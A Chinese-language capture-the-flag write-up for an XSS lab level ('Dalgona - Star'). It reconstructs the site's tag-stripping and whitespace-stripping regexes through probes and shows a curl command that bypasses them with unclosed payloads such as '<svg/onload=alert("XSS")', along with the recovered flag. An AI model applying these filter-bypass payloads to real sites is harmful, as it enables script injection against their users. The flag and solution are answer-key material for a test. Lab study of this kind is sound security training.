## 题解

### 入口与指纹

`Werkzeug/1.0.1` + `Python/2.7.18`，Dalgona 靶场第 24 关
（样式表 `static/css/xss/xss24.css`，标题 `Dalgona - Star`）。

首页入口 `Page` → `POST /page`，字段 `solution`：

```html
<form class="box-form" method="post">
  <div class="solution-text">Let the game begin. Good Luck</div>
  <input type=text name=solution placeholder="Enter solution...">
</form>
```

判据与同族一致：`Congratulations!<p> Here is the flag: flag{...}` 为成功。

### 关键观察

**1. 过滤是"静默改写"，不是"报错拦截"。**

提交 `<input autofocus onfocus=alert("XSS")>` 时，响应不是
`Sorry you can't use: ...`，而是**输入整个消失**、页面回到 `Let the game begin`。
说明这关做的是**内容改写**（sanitize），而不是黑名单拒绝。

**2. 改写的两条规则可以逐条测出来。**

| 输入 | 反射结果 | 推论 |
| --- | --- | --- |
| `a b` | `ab` | 空白被删（空格、`\t`、`\n`、`\r`、`\x0b` 都删） |
| `<b>` | （空） | 完整标签被删 |
| `<b>x</b>` | `x` | 删除标签、保留文本 |
| `<b` | `<b` | **没有 `>` 就不删** |
| `<>` | `<>` | `<[^>]+>` 要求中间至少一个字符 |
| `< >` | （空） | 有空格也算内容，所以被删 |
| `<<b>>` | `>` | 正则匹配 `<<b>`，剩下一个 `>` |
| `1<2` | `1<2` | 没有闭合 `>`，不动 |

结论：

```text
step1: re.sub(r'<[^>]+>', '', input)   # 先删标签
step2: re.sub(r'\s+', '', input)       # 再删所有空白
```

顺序可以确定：`< >` 被删说明**先删标签再删空白**（否则先删空白会变成 `<>`，而 `<>` 是能活的）。

**3. 两条规则各有一个缺口。**

| 规则 | 缺口 |
| --- | --- |
| 删 `<[^>]+>` | 只要**不写 `>`**，整个标签就躲过正则 |
| 删空白 | 用 `/` 代替空格，HTML5 允许 `/` 分隔属性 |

浏览器（HTML5）遇到未闭合的 `<svg/onload=...` 会继续往后吞，直到遇到下一个 `>` ——
模板后面的 `</form>` 里的 `>` 正好充当这个终止符，于是标签被正常建立并触发 `onload`。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -X POST \
  --data-urlencode 'solution=<svg/onload=alert("XSS")' \
  "http://$T/page" \
| grep -o 'flag{[^}]*}'
```

响应：

```html
Congratulations!<p> Here is the flag: flag{e6de05eb-4506-4cbe-8af2-996cda537e21}
```

同族其它可行载荷（同样不闭合、用 `/` 当分隔符）：

```text
<svg/onload=alert("XSS")
<body/onload=alert("XSS")
```

`<img/src=x/onerror=alert("XSS")` 反而不行——`img` 的属性解析在未闭合时更脆弱，
拿不到 `onerror`。所以「不闭合」这一招要配合**标签类型**试。

### flag 位置

成功响应的 `solution-text` 区块，`Here is the flag:` 之后。

## 复盘

- **区分"拒绝"和"改写"。** 同族 004/008 是黑名单拒绝（有 `Sorry you can't use` 提示），
  011 是静默改写（输入消失）。判据不同 → 应对思路完全不同：
  拒绝类要"换写法"，改写类要"找正则缺口"。
- **用差分实验还原 sanitizer 的正则。** 我用了 13 个探针
  （`<b`、`<>`、`< >`、`<<b>>`、`1<2`…），每条只差一个字符，
  就能确定 `<[^>]+>` 的形状和"先删标签再删空白"的顺序。
  这比读源码更快，而且完全不依赖实现细节。
- **未闭合标签是 `<[^>]+>` 类过滤的通用缺口。** 正则要求 `>` 收尾，
  浏览器不要求——它会把后面的文本继续当作标签内容，直到遇到任意 `>`。
- **空白被删时，`/` 是属性分隔符。** HTML5 解析器把 `/` 当作属性之间的分隔符，
  所以 `<svg/onload=x>` 等价于 `<svg onload=x>`。这条对"删空格"类过滤普遍有效。
- **同一招对不同标签效果不同。** `svg`/`body` 在未闭合时仍能挂上事件处理器，
  `img` 就不行。所以要准备 2–3 个标签变体，而不是只试一个。
